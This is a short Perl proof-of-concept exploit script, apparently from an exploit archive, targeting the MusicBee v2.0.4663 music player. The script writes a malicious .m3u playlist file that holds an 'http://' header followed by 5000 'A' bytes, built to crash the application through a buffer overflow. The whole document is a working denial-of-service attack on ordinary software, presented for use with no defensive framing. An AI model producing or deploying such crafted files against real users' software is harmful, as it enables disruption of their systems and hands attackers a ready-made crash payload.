#!/usr/bin/perl
#
#
#
#############################################################
#
# Exploit Title: MusicBee v2.0.4663 .M3U Denial of Service Exploit 
# Date: 2013/6/19 
# Exploit Author: Chako 
# Vendor Homepage: http://getmusicbee.com/
# Version: v2.0.4663
# Tested on: Windows XP SP3 English
#############################################################

$HEADER = "http://";
#$BOF    = "\x41" x 3740;
$BOF    = "\x41" x 5000;


open(myfile, '> MusicBee _EXP.m3u');
print myfile $HEADER.$BOF;
